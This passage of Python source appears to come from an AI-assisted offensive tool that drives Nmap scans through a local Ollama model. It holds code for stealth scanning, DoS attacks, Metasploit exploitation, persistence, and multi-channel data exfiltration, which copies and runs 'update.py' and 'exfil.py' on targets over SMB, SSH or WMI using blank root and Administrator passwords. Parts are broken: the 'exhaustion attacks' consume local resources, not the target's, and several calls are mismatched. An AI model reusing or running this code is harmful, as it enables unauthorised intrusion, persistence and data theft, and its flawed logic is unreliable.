            # Wait for it to complete
            output, error = process.communicate()
            
            # Stop animation
            animation.set()
            
            # Combine stdout and stderr
            combined_output = output
            if error:
                combined_output += f"\nERROR OUTPUT:\n{error}"
            
            # Display summary
            self.viewer.script_execution_summary(
                script_path,
                process.returncode,
                combined_output
            )
            
            if process.returncode == 0:
                self.logger.info(f"Script executed successfully")
                return True
            else:
                self.logger.error(f"Script execution failed with return code {process.returncode}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error executing script: {e}")
            self.viewer.error(f"Script execution failed: {str(e)}")
            return False

    def run(self):
        """Main execution method."""
        try:
            # Display start banner using the viewer
            self.viewer.display_start_banner(
                self.target, 
                "DoS Attack" if self.dos_attack else "Standard Scan", 
                self.ollama_model
            )
            
            # Ensure Ollama model is available
            logger.info(f"Using existing model: {self.ollama_model}")
            self._ensure_model_available()
            
            # Initialize network discovery if needed
            if self.auto_discover:
                logger.info("Starting network discovery...")
                self._discover_network()
            
            # Setup Metasploit if requested
            if self.msf_integration:
                logger.info("Setting up Metasploit integration...")
                self.setup_metasploit()
            
            # Main scan loop
            iteration = 1
            while iteration <= self.max_iterations:
                logger.info(f"Starting scan iteration {iteration}/{self.max_iterations}")
                
                # Generate scan parameters
                scan_params = self.generate_scan_parameters(iteration)
                logger.info(f"Using scan parameters: {scan_params}")
                
                # Run the scan
                logger.info(f"Running Nmap scan on target: {self.target}")
                result = self.run_nmap_scan(scan_params)
                
                # Process results
                if result:
                    logger.info("Processing scan results...")
                    self.summarize_results(result)
                    
                    # Handle DoS attack if requested
                    if self.dos_attack:
                        logger.info("Initiating DoS attack...")
                        success = self.perform_dos_attack(self.target)
                        logger.info(f"DoS attack {'successful' if success else 'failed'}")
                    
                    # Handle exploitation if requested
                    if self.exploit:
                        logger.info("Attempting exploitation...")
                        self.run_exploits_on_host(self.target)
                    
                    # Generate custom scripts if requested
                    if self.custom_scripts:
                        logger.info("Generating custom scripts...")
                        script_type = self.determine_best_script_type()
                        self.generate_custom_script(script_type)
                
                # Check if we should continue
                if not self.continuous:
                    break
                
                # Wait before next iteration
                if iteration < self.max_iterations:
                    logger.info(f"Waiting {self.delay} seconds before next iteration...")
                    time.sleep(self.delay)
                
                iteration += 1
            
            logger.info("Scan completed successfully")
            
        except KeyboardInterrupt:
            logger.info("Scan interrupted by user")
        except Exception as e:
            logger.error(f"Error during scan: {e}")
            if self.debug:
                traceback.print_exc()
            raise
    
    def determine_best_script_type(self):
        """Determine the best script type based on scan results."""
        # Default to bash
        script_type = "bash"
        
        try:
            # Get open ports from scan history
            open_ports = self.get_open_ports_from_history()
            
            # Check if specific services are running
            has_web_server = False
            has_windows_services = False
            
            for entry in self.scan_history:
                result = entry.get('result', {})
                if 'scan' in result and self.target in result['scan']:
                    target_info = result['scan'][self.target]
                    
                    # Check for web services
                    for proto in ['tcp', 'udp']:
                        if proto in target_info:
                            for port, port_data in target_info[proto].items():
                                service = port_data.get('name', '').lower()
                                
                                if service in ['http', 'https']:
                                    has_web_server = True
                                elif service in ['msrpc', 'microsoft-ds', 'netbios-ssn']:
                                    has_windows_services = True
            
            # Choose script type based on services
            if has_web_server:
                script_type = "python"  # Python is good for web services
            elif has_windows_services:
                script_type = "powershell"  # PowerShell for Windows targets
                
            self.logger.info(f"Determined best script type: {script_type}")
            return script_type
            
        except Exception as e:
            self.logger.error(f"Error determining best script type: {e}")
            return script_type
    
    def generate_scan_parameters(self, iteration):
        """Generate Nmap scan parameters based on iteration number."""
        if iteration == 1:
            # First iteration: Quick scan to identify open ports
            self.logger.info("First iteration: Quick scan to identify open ports")
            if self.stealth:
                # Stealthier scan with timing template 2
                parameters = [
                    "-sS",  # SYN scan
                    "-T2",  # Timing template 2 (slower but stealthier)
                    "-F",   # Fast scan (top 100 ports)
                    "-sV",  # Version detection
                    "--version-intensity", "2",  # Version detection intensity
                    "-O",   # OS detection
                    "--osscan-limit",  # Limit OS detection to promising targets
                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
                    "--script-trace",  # Show script execution details
                    self.target if self.target else self.discovered_hosts[self.current_target_index]
                ]
            else:
                # Normal quick scan
                parameters = [
                    "-sS",  # SYN scan
                    "-T4",  # Timing template 4 (normal speed)
                    "-F",   # Fast scan (top 100 ports)
                    "-sV",  # Version detection
                    "--version-intensity", "2",  # Version detection intensity
                    "-O",   # OS detection
                    "--osscan-limit",  # Limit OS detection to promising targets
                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
                    "--script-trace",  # Show script execution details
                    self.target if self.target else self.discovered_hosts[self.current_target_index]
                ]
        elif iteration == 2:
            # Second iteration: Detailed scan of ports found in first scan
            self.logger.info("Second iteration: Detailed scan of ports found in first scan")
            ports = self.get_open_ports_from_history()
            if ports:
                # Scan specific ports found in previous iterations
                port_list = ",".join(map(str, ports))
                parameters = [
                    "-sS",  # SYN scan
                    "-T4",  # Timing template 4
                    "-p", port_list,  # Specific ports
                    "-sV",  # Version detection
                    "-O",   # OS detection
                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
                    "--script-trace",  # Show script execution details
                    self.target if self.target else self.discovered_hosts[self.current_target_index]
                ]
            else:
                # Fall back to scanning top 1000 ports
                parameters = [
                    "-sS",  # SYN scan
                    "-T4",  # Timing template 4
                    "-p", "1-1000",  # Top 1000 ports
                    "-sV",  # Version detection
                    "-O",   # OS detection
                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
                    "--script-trace",  # Show script execution details
                    self.target if self.target else self.discovered_hosts[self.current_target_index]
                ]
        else:
            # Advanced iterations: Generate based on AI suggestions or use comprehensive scan
            if self.scan_history and len(self.scan_history) >= 2:
                # Use AI to suggest parameters based on scan history
                self.logger.info("Advanced iteration: AI-suggested scan parameters")
                
                # Generate prompt for Ollama
                prompt = self.construct_prompt(iteration)
                
                # Call Ollama to get suggested scan parameters
                if self.show_live_ai:
                    response = self.call_ollama(prompt, stream=True)
                else:
                    # Start a simple animation for better UX
                    animation = SingleLineAnimation("Generating adaptive scan parameters...")
                    response = self.call_ollama(prompt)
                    animation.set()
                    
                # Parse response to get suggested parameters
                suggested_params = self.parse_ollama_response(response)
                
                # If we got valid parameters, use them
                if suggested_params and isinstance(suggested_params, list) and len(suggested_params) > 2:
                    # Make target the first parameter
                    if self.target:
                        suggested_params.insert(0, self.target)
                    elif self.discovered_hosts:
                        suggested_params.insert(0, self.discovered_hosts[self.current_target_index])
                        
                    # Sanitize parameters (no -oX)
                    parameters = []
                    i = 0
                    while i < len(suggested_params):
                        if suggested_params[i] == "-oX" and i < len(suggested_params) - 1 and suggested_params[i+1] == "-":
                            # Skip both "-oX" and "-" parameters
                            i += 2
                        else:
                            parameters.append(suggested_params[i])
                            i += 1
                        
                    # Add script error handling parameters
                    if "--script" in parameters:
                        parameters.extend([
                            "--script-args", "http-security-headers.output=all",
                            "--script-trace"
                        ])
                        
                    self.logger.info(f"AI-suggested scan parameters: {' '.join(parameters)}")
                else:
                    # Fallback to comprehensive scan
                    self.logger.info("Advanced iteration: Comprehensive scan (AI fallback)")
                    parameters = [
                        "-sS",  # SYN scan
                        "-T4",  # Timing template 4
                        "-p", "1-10000",  # Full port scan
                        "-sV",  # Version detection
                        "--version-intensity", "4",  # Maximum version detection intensity
                        "-O",   # OS detection
                        "--osscan-guess",  # Guess OS even if not 100% sure
                        "--script", "default,safe,http-*",  # Run default, safe, and http scripts
                        "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
                        "--script-trace",  # Show script execution details
                        self.target if self.target else self.discovered_hosts[self.current_target_index]
                    ]
            else:
                # Not enough history for AI, use comprehensive scan
                self.logger.info("Advanced iteration: Comprehensive scan")
                parameters = [
                    "-sS",  # SYN scan
                    "-T4",  # Timing template 4
                    "-p", "1-10000",  # Full port scan
                    "-sV",  # Version detection
                    "--version-intensity", "4",  # Maximum version detection intensity
                    "-O",   # OS detection
                    "--osscan-guess",  # Guess OS even if not 100% sure
                    "--script", "default,safe,http-*",  # Run default, safe, and http scripts
                    "--script-args", "http-security-headers.output=all",  # Fix for http-security-headers
                    "--script-trace",  # Show script execution details
                    self.target if self.target else self.discovered_hosts[self.current_target_index]
                ]
        
        # Apply stealth mode if enabled (for iterations after the first)
        if self.stealth and iteration > 1:
            # Replace timing template with more stealthy one
            for i, param in enumerate(parameters):
                if param == "-T4":
                    parameters[i] = "-T2"
                    
            # Add randomized timing options for additional stealth
            parameters.extend(["--randomize-hosts", "--max-retries", "2"])
            
        return parameters
    
    def run_nmap_scan(self, scan_params):
        """Run an Nmap scan with the given parameters."""
        if not scan_params:
            self.logger.error("No scan parameters provided")
            return None
            
        self.logger.info(f"Scan parameters: {' '.join(scan_params)}")
        
        target = self.target if self.target else self.discovered_hosts[self.current_target_index]
        self.logger.info(f"Target: {target}")
        
        # Create a temporary file for XML output
        try:
            fd, xml_output = tempfile.mkstemp(suffix='.xml', prefix='nmap_')
            os.close(fd)
            self.logger.debug(f"Created temporary XML file: {xml_output}")
            
            # Build the nmap command with optimized parameters
            nmap_cmd = ['nmap']
            
            # Add XML output first
            nmap_cmd.extend(['-oX', xml_output])
            
            # Add optimized parameters
            nmap_cmd.extend([
                '--min-parallelism', '10',  # Increase parallel probes
                '--max-retries', '2',       # Limit retries
                '--max-scan-delay', '5s',   # Limit scan delay
                '--min-rate', '100',        # Minimum packets per second
                '--max-rate', '1000',       # Maximum packets per second
                '--nsock-engine', 'epoll',  # Use epoll for better performance
                '--no-stylesheet',          # Don't include stylesheet in XML
                '--no-system-dns',          # Don't use system DNS
                '--dns-servers', '8.8.8.8,8.8.4.4'  # Use Google DNS
            ])
            
            # Add all parameters except target
            for param in scan_params:
                if param != target:  # Avoid adding target twice
                    nmap_cmd.append(param)
            
            # Add target last
            nmap_cmd.append(target)
            
            self.logger.debug(f"Full nmap command: {' '.join(nmap_cmd)}")
            
            # Start animation
            animation = self.viewer.scanning_animation(f"Scanning {target}")
            
            # Run nmap as a subprocess with proper timeout
            self.logger.info(f"Starting Nmap scan with command: {' '.join(nmap_cmd)}")
            
            # Run the command and capture output in real-time
            process = subprocess.Popen(
                nmap_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1,
                encoding='utf-8',
                errors='replace'  # Handle invalid UTF-8 gracefully
            )
            
            # Read output in real-time with timeout
            output_lines = []
            error_lines = []
            start_time = time.time()
            timeout = 300  # 5 minutes timeout
            
            while True:
                # Check for timeout
                if time.time() - start_time > timeout:
                    process.terminate()
                    self.logger.error("Nmap scan timed out after 5 minutes")
                    break
                
                # Read output line by line with timeout
                try:
                    output_line = process.stdout.readline()
                    if output_line:
                        # Filter out NSOCK debug messages
                        if not any(msg in output_line for msg in [
                            "NSOCK INFO",
                            "NSOCK ERROR",
                            "NSOCK WARNING",
                            "NSOCK DEBUG",
                            "Ethernet",
                            "UDP",
                            "TCP",
                            "CONNECT",
                            "SEND",
                            "CLOSE"
                        ]):
                            output_lines.append(output_line.strip())
                            if not self.quiet:
                                print(output_line.strip())
                            self.logger.debug(f"Nmap output: {output_line.strip()}")
                except Exception as e:
                    self.logger.error(f"Error reading stdout: {e}")
                    break
                
                # Read error line by line with timeout
                try:
                    error_line = process.stderr.readline()
                    if error_line:
                        error_text = error_line.strip()
                        # Filter out common debug messages
                        if not any(msg in error_text for msg in [
                            "NSOCK INFO",
                            "NSOCK ERROR",
                            "NSOCK WARNING",
                            "NSOCK DEBUG",
                            "Ethernet",
                            "UDP",
                            "TCP",
                            "CONNECT",
                            "SEND",
                            "CLOSE"
                        ]):
                            error_lines.append(error_text)
                            if not self.quiet:
                                print(f"Error: {error_text}", file=sys.stderr)
                            self.logger.debug(f"Nmap error: {error_text}")
                except Exception as e:
                    self.logger.error(f"Error reading stderr: {e}")
                    break
                
                # Check if process has finished
                if process.poll() is not None:
                    break
            
            # Get the return code
            return_code = process.poll()
            self.logger.info(f"Nmap process finished with return code: {return_code}")
            
            # Stop animation
            if 'animation' in locals():
                animation.set()
            
            # Check if the scan was successful
            if return_code != 0:
                self.logger.error(f"Nmap scan failed with return code {return_code}")
                self.logger.error("Error output:")
                for line in error_lines:
                    self.logger.error(line)
                return None
            
            # Check if XML file exists and has content
            if not os.path.exists(xml_output):
                self.logger.error("XML output file was not created")
                return None
                
            if os.path.getsize(xml_output) == 0:
                self.logger.error("XML output file is empty")
                return None
            
            # Parse the XML output using DirectNmapScanner
            try:
                self.logger.debug("Parsing Nmap XML output...")
                result = DirectNmapScanner.parse_xml(xml_output, nmap_cmd, 0, '\n'.join(output_lines), '\n'.join(error_lines))
                
                if result:
                    self.logger.info("Successfully parsed Nmap output")
                    
                    # Add to scan history
                    self.scan_history.append({
                        'timestamp': datetime.datetime.now(),
                        'target': target,
                        'parameters': scan_params,
                        'result': result
                    })
                    
                    # Calculate scan duration
                    elapsed = float(result['nmap']['scanstats'].get('elapsed', '0'))
                    
                    # Get open port stats
                    if target in result['scan']:
                        tcp_count = len(result['scan'][target].get('tcp', {}))
                        udp_count = len(result['scan'][target].get('udp', {}))
                        self.logger.info(f"Scan completed in {int(elapsed)}s: {tcp_count} TCP ports and {udp_count} UDP ports found")
                    
                    # Display scan summary
                    self.viewer.scan_summary(target, result)
                    
                    return result
                else:
                    self.logger.error("Failed to parse Nmap output")
                    return None
                    
            except Exception as e:
                self.logger.error(f"Error parsing Nmap output: {e}")
                self.viewer.error(f"Error parsing Nmap output: {str(e)}")
                if self.debug:
                    traceback.print_exc()
                return None
                
            finally:
                # Clean up XML file
                if os.path.exists(xml_output):
                    try:
                        os.unlink(xml_output)
                        self.logger.debug("Cleaned up temporary XML file")
                    except OSError as e:
                        self.logger.warning(f"Failed to remove temporary XML file: {e}")
        
        except Exception as e:
            self.logger.error(f"Error running Nmap scan: {e}")
            if self.debug:
                traceback.print_exc()
            return None
    
    def summarize_results(self, result):
        """Summarize scan results in a readable format."""
        if not result or 'scan' not in result:
            self.logger.warning("No results to summarize")
            return

        target = self.target if self.target else self.discovered_hosts[self.current_target_index]
        
        if target not in result['scan']:
            self.logger.warning(f"Target {target} not found in scan results")
            self.viewer.warning(f"No results found for target {target}")
            return
        
        # Extract information from scan result
        target_info = result['scan'][target]
        
        # Count open ports
        tcp_count = len(target_info.get('tcp', {}))
        udp_count = len(target_info.get('udp', {}))
        
        # Log summary information
        scan_duration = int(result.get('elapsed', 0))
        self.logger.info(f"Scan completed in {scan_duration}s: {tcp_count} TCP ports and {udp_count} UDP ports found")
        
        # Display scan summary using the viewer
        self.viewer.scan_summary(target, result)
    
    # Ollama integration methods
    def prepare_ollama_context(self):
        """Prepare context for Ollama."""
        context = {
            'target': self.target,
            'scan_history': self.scan_history,
            'open_ports': self.get_open_ports_from_history()
        }
        
        # Additional context from latest scan
        if self.scan_history:
            latest_scan = self.scan_history[-1]
            result = latest_scan.get('result', {})
            
            if 'scan' in result and self.target in result['scan']:
                target_info = result['scan'][self.target]
                
                # Extract OS info
                if 'osmatch' in target_info and target_info['osmatch']:
                    context['os'] = target_info['osmatch'][0].get('name', 'Unknown')
                    
                # Extract hostname
                if 'hostnames' in target_info and target_info['hostnames']:
                    context['hostname'] = target_info['hostnames'][0].get('name', 'Unknown')
                    
                # Extract service details
                services = []
                for proto in ['tcp', 'udp']:
                    if proto in target_info:
                        for port, port_data in target_info[proto].items():
                            if port_data['state'] == 'open':
                                service = {
                                    'port': port,
                                    'proto': proto,
                                    'name': port_data.get('name', 'unknown'),
                                    'product': port_data.get('product', ''),
                                    'version': port_data.get('version', '')
                                }
                                services.append(service)
                                
                context['services'] = services
        
        return context
    
    def call_ollama(self, prompt, stream=False):
        """Call the Ollama API to generate text."""
        try:
            self.logger.info("Calling Ollama API...")
            
            # Prepare request
            request_data = {
                "model": self.ollama_model,
                "prompt": prompt,
                "stream": stream
            }
            
            # Make the API call
            animation = None
            if not self.show_live_ai:
                animation = self.viewer.scanning_animation("Generating AI response")
                
            try:
                response = requests.post(
                    self.ollama_url,
                    json=request_data,
                    stream=stream,
                    timeout=60
                )
                
                # Check for successful response
                if response.status_code != 200:
                    self.logger.error(f"Ollama API error: {response.status_code} - {response.text}")
                    if animation:
                        animation.set()
                    return self.generate_fallback_response(prompt)
                
                # Handle streaming response
                if stream:
                    return self._handle_streaming_response(response, animation)
                    
                # Handle regular response
                result = response.json()
                
                if 'response' in result:
                    if animation:
                        animation.set()
                    return result['response']
                else:
                    self.logger.error(f"Unexpected response format from Ollama API: {result}")
                    if animation:
                        animation.set()
                    return self.generate_fallback_response(prompt)
                    
            except requests.exceptions.Timeout:
                self.logger.error("Timeout calling Ollama API")
                if animation:
                    animation.set()
                self.viewer.warning("AI response timed out, using fallback")
                return self.generate_fallback_response(prompt)
                
            except Exception as e:
                self.logger.error(f"Error calling Ollama API: {e}")
                if animation:
                    animation.set()
                return self.generate_fallback_response(prompt)
                
        except Exception as e:
            self.logger.error(f"Unexpected error in call_ollama: {e}")
            return self.generate_fallback_response(prompt)
    
    def _handle_streaming_response(self, response, animation):
        """Handle streaming response from Ollama."""
        try:
            full_response = ""
            
            for line in response.iter_lines():
                if line:
                    try:
                        # Parse JSON from the line
                        json_data = json.loads(line.decode('utf-8'))
                        
                        # Extract response chunk
                        if 'response' in json_data:
                            chunk = json_data['response']
                            full_response += chunk
                            
                            # Display chunk if live output is enabled
                            if self.show_live_ai:
                                print(chunk, end='', flush=True)
                    except json.JSONDecodeError:
                        self.logger.warning(f"Could not parse JSON from line: {line}")
            
            # Add a newline after streaming if we showed live output
            if self.show_live_ai:
                print()
            
            # Stop the animation if it was started
            if animation:
                animation.set()
                
            return full_response
            
        except Exception as e:
            self.logger.error(f"Error handling streaming response: {e}")
            if animation:
                animation.set()
            return self.generate_fallback_response("Error processing streaming response")
    
    def generate_fallback_response(self, prompt):
        """Generate a fallback response when Ollama fails."""
        self.logger.info("Generating fallback response...")
        
        # Extract key information from prompt
        target = self.target
        open_ports = self.get_open_ports_from_history()
        
        # Check if prompt is for script generation
        if "Generate a " in prompt and "script" in prompt:
            script_type = "bash"
            if "python" in prompt.lower():
                script_type = "python"
            elif "ruby" in prompt.lower():
                script_type = "ruby"
            elif "powershell" in prompt.lower():
                script_type = "powershell"
                
            if script_type == "bash":
                return f"""```bash
#!/bin/bash
# Reconnaissance Script for {target}
# Generated as fallback when AI is unavailable
# This script performs basic reconnaissance on the target system

TARGET="{target}"
OPEN_PORTS=({' '.join(str(port) for port in open_ports)})

echo "Starting reconnaissance on $TARGET"
echo "Open ports: ${{OPEN_PORTS[@]}}"

# Ping the target
echo "Checking if host is up..."
ping -c 3 $TARGET

# Check each open port
for PORT in "${{OPEN_PORTS[@]}}"; do
  echo "Checking port $PORT..."
  
  case $PORT in
    21)
      echo "FTP port detected, checking banner..."
      echo -e "\\n" | nc -w 5 $TARGET $PORT
      ;;
    22)
      echo "SSH port detected, checking banner..."
      echo -e "\\n" | nc -w 5 $TARGET $PORT
      ;;
    80|443)
      echo "Web port detected, checking headers..."
      curl -s -I http://$TARGET:$PORT
      ;;
    *)
      echo "Generic port check..."
      nc -z -w 5 $TARGET $PORT && echo "Port $PORT is open" || echo "Port $PORT is closed"
      ;;
  esac
done

echo "Reconnaissance completed"
```"""
            elif script_type == "python":
                return f"""```python
#!/usr/bin/env python3
# Reconnaissance Script for {target}
# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# This script performs basic reconnaissance on the target system

import socket
import subprocess
import sys
import os

TARGET = "{target}"
OPEN_PORTS = {open_ports}

def main():
    print(f"Starting reconnaissance on {{TARGET}}")
    print(f"Open ports: {{OPEN_PORTS}}")
    
    # Ping the target
    print("Checking if host is up...")
    try:
        subprocess.run(["ping", "-c", "3", TARGET], check=True)
    except subprocess.CalledProcessError:
        print(f"Host {{TARGET}} appears to be down")
    
    # Check each open port
    for port in OPEN_PORTS:
        print(f"Checking port {{port}}...")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                result = s.connect_ex((TARGET, port))
                if result == 0:
                    print(f"Port {{port}} is open")
                else:
                    print(f"Port {{port}} is closed")
        except Exception as e:
            print(f"Error checking port {{port}}: {{e}}")
    
    print("Reconnaissance completed")

if __name__ == "__main__":
    main()
```"""
        
        # Default fallback response
        fallback_response = f"""Based on the reconnaissance of {target}, here are the key findings:

1. Open Ports: {", ".join(str(port) for port in open_ports) if open_ports else "None detected"}

2. Recommended Actions:
   - Perform a more detailed scan of the open ports
   - Investigate any running services for vulnerabilities
   - Document findings for further analysis

This is a basic response generated when the AI model is unavailable."""

        return fallback_response
    
    def parse_ollama_response(self, response):
        """Parse the response from Ollama to extract key information."""
        try:
            # For script generation, extract code blocks
            if "```" in response:
                code_block_pattern = r"```(?:\w+)?\s*(.+?)```"
                code_blocks = re.findall(code_block_pattern, response, re.DOTALL)
                
                if code_blocks:
                    return code_blocks[0].strip()
            
            # Otherwise, return the full response
            return response.strip()
            
        except Exception as e:
            self.logger.error(f"Error parsing Ollama response: {e}")
            return response.strip()
    
    def get_open_ports_from_history(self):
        """Get a list of open ports from the scan history."""
        open_ports = []
        
        for entry in self.scan_history:
            result = entry.get('result', {})
            
            if 'scan' in result and self.target in result['scan']:
                target_info = result['scan'][self.target]
                
                for proto in ['tcp', 'udp']:
                    if proto in target_info:
                        for port, port_data in target_info[proto].items():
                            if port_data['state'] == 'open':
                                try:
                                    port_num = int(port)
                                    if port_num not in open_ports:
                                        open_ports.append(port_num)
                                except ValueError:
                                    pass
        
        return sorted(open_ports)
    
    def construct_prompt(self, iteration):
        """Construct a prompt for the LLM based on scan results and current iteration."""
        # Get context from scan history
        context = self.prepare_ollama_context()
        
        # Construct prompt based on iteration and context
        if iteration == 1:
            prompt = f"Based on the initial scan of {self.target}, suggest the next steps for reconnaissance."
        elif iteration == 2:
            prompt = f"Based on the detailed scan of {self.target}, identify potential vulnerabilities and suggest exploitation strategies."
        else:
            prompt = f"Based on comprehensive scanning of {self.target}, provide a security assessment and recommended actions."
            
        return prompt

    def establish_persistence(self, target):
        """Attempt to establish persistent access to the target."""
        try:
            self.logger.info(f"Attempting to establish persistence on {target}")
            
            # Generate appropriate persistence script
            if self._is_windows_target(target):
                script = self._generate_windows_persistence()
            else:
                script = self._generate_linux_persistence()
                
            if not script:
                self.logger.error("Failed to generate persistence script")
                return False
                
            # Execute the script
            if not self._execute_persistence_script(target, script):
                self.logger.error("Failed to execute persistence script")
                return False
                
            self.logger.info("Successfully established persistence")
            return True
            
        except Exception as e:
            self.logger.error(f"Error establishing persistence: {e}")
            return False
            
    def exfiltrate_data(self, target):
        """Attempt to exfiltrate data from the target."""
        try:
            self.logger.info(f"Attempting to exfiltrate data from {target}")
            
            # Generate appropriate exfiltration script based on method
            if self.exfil_method == "dns":
                script = self._generate_dns_exfiltration()
            elif self.exfil_method == "http":
                script = self._generate_http_exfiltration()
            elif self.exfil_method == "icmp":
                script = self._generate_icmp_exfiltration()
            elif self.exfil_method == "smb":
                script = self._generate_smb_exfiltration()
            elif self.exfil_method == "ftp":
                script = self._generate_ftp_exfiltration()
            else:
                self.logger.error(f"Unsupported exfiltration method: {self.exfil_method}")
                return False
                
            if not script:
                self.logger.error("Failed to generate exfiltration script")
                return False
                
            # Execute the script
            if not self._execute_exfiltration_script(target, script):
                self.logger.error("Failed to execute exfiltration script")
                return False
                
            self.logger.info("Successfully exfiltrated data")
            return True
            
        except Exception as e:
            self.logger.error(f"Error exfiltrating data: {e}")
            return False
            
    def perform_red_team_operations(self, target):
        """Perform full red team operations on the target."""
        try:
            self.logger.info(f"Starting red team operations on {target}")
            
            # 1. Initial reconnaissance
            self.logger.info("Performing initial reconnaissance")
            scan_results = self.run_nmap_scan(target)
            if not scan_results:
                self.logger.error("Failed to perform initial reconnaissance")
                return False
                
            # 2. Vulnerability assessment
            self.logger.info("Performing vulnerability assessment")
            vulns = self.assess_vulnerabilities(target, scan_results)
            if not vulns:
                self.logger.error("Failed to assess vulnerabilities")
                return False
                
            # 3. Exploitation
            self.logger.info("Attempting exploitation")
            if not self.exploit_target(target, vulns):
                self.logger.error("Failed to exploit target")
                return False
                
            # 4. Persistence
            if self.persistence:
                self.logger.info("Establishing persistence")
                if not self.establish_persistence(target):
                    self.logger.error("Failed to establish persistence")
                    return False
                    
            # 5. Data exfiltration
            if self.exfil:
                self.logger.info("Exfiltrating data")
                if not self.exfiltrate_data(target):
                    self.logger.error("Failed to exfiltrate data")
                    return False
                    
            self.logger.info("Red team operations completed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Error during red team operations: {e}")
            return False

    def _execute_persistence_script(self, target, script):
        """Execute a persistence script on the target."""
        try:
            # Create a temporary file for the script
            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
            script_file.write(script)
            script_file.close()
            
            # Copy the script to the target
            if self._is_windows_target(target):
                # Use SMB to copy the script
                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
                with open(script_file.name, 'rb') as f:
                    smb_client.put_file(f, 'Windows\\Temp\\update.py')
            else:
                # Use SSH to copy the script
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username='root', password='')
                sftp = ssh.open_sftp()
                sftp.put(script_file.name, '/tmp/update.py')
                sftp.close()
                ssh.close()
            
            # Execute the script
            if self._is_windows_target(target):
                # Use WMI to execute the script
                wmi = wmi.WMI(computer=target, user='Administrator', password='')
                wmi.Win32_Process.Create(CommandLine=f'python {script_file.name}')
            else:
                # Use SSH to execute the script
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username='root', password='')
                stdin, stdout, stderr = ssh.exec_command(f'python3 /tmp/update.py')
                ssh.close()
            
            # Clean up
            os.unlink(script_file.name)
            
            return True
        except Exception as e:
            self.logger.error(f"Error executing persistence script: {e}")
            return False
            
    def _execute_exfiltration_script(self, target, script):
        """Execute a data exfiltration script on the target."""
        try:
            # Create a temporary file for the script
            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
            script_file.write(script)
            script_file.close()
            
            # Copy the script to the target
            if self._is_windows_target(target):
                # Use SMB to copy the script
                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
                with open(script_file.name, 'rb') as f:
                    smb_client.put_file(f, 'Windows\\Temp\\exfil.py')
            else:
                # Use SSH to copy the script
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username='root', password='')
                sftp = ssh.open_sftp()
                sftp.put(script_file.name, '/tmp/exfil.py')
                sftp.close()
                ssh.close()
            
            # Execute the script
            if self._is_windows_target(target):
                # Use WMI to execute the script
                wmi = wmi.WMI(computer=target, user='Administrator', password='')
                wmi.Win32_Process.Create(CommandLine=f'python {script_file.name}')
            else:
                # Use SSH to execute the script
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username='root', password='')
                stdin, stdout, stderr = ssh.exec_command(f'python3 /tmp/exfil.py')
                ssh.close()
            
            # Clean up
            os.unlink(script_file.name)
            
            return True
        except Exception as e:
            self.logger.error(f"Error executing exfiltration script: {e}")
            return False
            
    def _is_windows_target(self, target):
        """Check if the target is a Windows system."""
        try:
            # Try to connect using WMI
            wmi = wmi.WMI(computer=target, user='Administrator', password='')
            return True
        except:
            try:
                # Try to connect using SMB
                smb_client = smbclient.SambaClient(server=target, share='C$', username='Administrator', password='')
                return True
            except:
                return False

    def _cpu_exhaustion_attack(self, target):
        """Perform a CPU exhaustion attack."""
        try:
            import threading
            import time
            import math
            
            def cpu_intensive():
                while time.time() < end_time:
                    # Perform CPU-intensive calculations
                    for i in range(1000):
                        math.factorial(i)
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=cpu_intensive)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in CPU exhaustion attack: {e}")
            return False
            
    def _memory_exhaustion_attack(self, target):
        """Perform a memory exhaustion attack."""
        try:
            import threading
            import time
            
            def memory_intensive():
                memory_blocks = []
                while time.time() < end_time:
                    try:
                        # Allocate large memory blocks
                        memory_blocks.append('x' * 1024 * 1024)  # 1MB blocks
                    except:
                        # Clear some blocks if memory is full
                        if memory_blocks:
                            memory_blocks.pop()
                            
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=memory_intensive)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in memory exhaustion attack: {e}")
            return False
            
    def _disk_exhaustion_attack(self, target):
        """Perform a disk space exhaustion attack."""
        try:
            import threading
            import time
            import os
            
            def disk_intensive():
                files = []
                while time.time() < end_time:
                    try:
                        # Create large files
                        filename = f"dos_file_{time.time()}.dat"
                        with open(filename, 'wb') as f:
                            f.write(os.urandom(1024 * 1024))  # 1MB files
                        files.append(filename)
                    except:
                        # Clean up some files if disk is full
                        if files:
                            try:
                                os.remove(files.pop())
                            except:
                                pass
                                
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=disk_intensive)
